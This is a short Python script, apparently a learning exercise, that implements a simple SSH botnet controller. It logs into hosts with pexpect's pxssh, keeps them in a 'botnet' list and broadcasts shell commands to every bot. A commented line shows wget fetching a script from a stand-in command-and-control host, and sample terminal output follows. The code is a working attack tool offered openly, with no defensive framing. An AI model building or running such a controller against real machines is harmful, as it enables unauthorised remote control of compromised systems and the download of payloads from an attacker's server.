from pexpect import pxssh

class Bot:

    # initialize new client
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.ssh()


    # secure shell into client
    def ssh(self):
        try:
            bot = pxssh.pxssh()
            bot.login(self.host, self.user, self.password)
            return bot
        except Exception as e:
            print('Connection failure.')
            print(e)


    # send command to client
    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


# send a command to all bots in the botnet
def command_bots(command):
    for bot in botnet:
        attack = bot.send_command(command)
        print('Output from ' + bot.host)
        print(attack)

# list of bots in botnet
botnet = []

# add a new bot to your botnet
def add_bot(host, user, password):
    new_bot = Bot(host, user, password)
    botnet.append(new_bot)

add_bot('', '', '')

# list user home directory
command_bots('ls -la')

# download scripts/files etc.
# command_bots("""wget  -O /Users/Owner/Desktop/ "http://c&cserver.com/script.py""")

# Output from
# b'\x1b[K\x1b[?1h\x1b=\x1b[?2004hl\x08ls\x1b[?1l\x1b>\x1b[?2004l\r\r\n\x1b]2;ls -G\x07\x1b]1;ls\x07\x1b[1m\x1b[36mApplication
# s\x1b[39;49m\x1b[0m         \x1b[1m\x1b[36mLibrary\x1b[39;49m\x1b[0m              botkey.py\r\n\x1b[1m\x1b[36mCreative Cloud
#  Files\x1b[39;49m\x1b[0m \x1b[1m\x1b[36mMovies\x1b[39;49m\x1b[0m               botkey_backup.py\r\n\x1b[1m\x1b[36mDesktop\x1
# b[39;49m\x1b[0m              \x1b[1m\x1b[36mMusic\x1b[39;49m\x1b[0m                botnet.py.pub\r\n\x1b[1m\x1b[36mDocuments
# \x1b[39;49m\x1b[0m            \x1b[1m\x1b[36mPictures\x1b[39;49m\x1b[0m             \x1b[1m\x1b[36mdev\x1b[39;49m\x1b[0m\r\n
# \x1b[1m\x1b[36mDownloads\x1b[39;49m\x1b[0m            \x1b[1m\x1b[36mPublic\x1b[39;49m\x1b[0m               get-pip.py\r\n\x
# 1b[1m\x1b[7m%\x1b[27m\x1b[1m\x1b[0m  \'
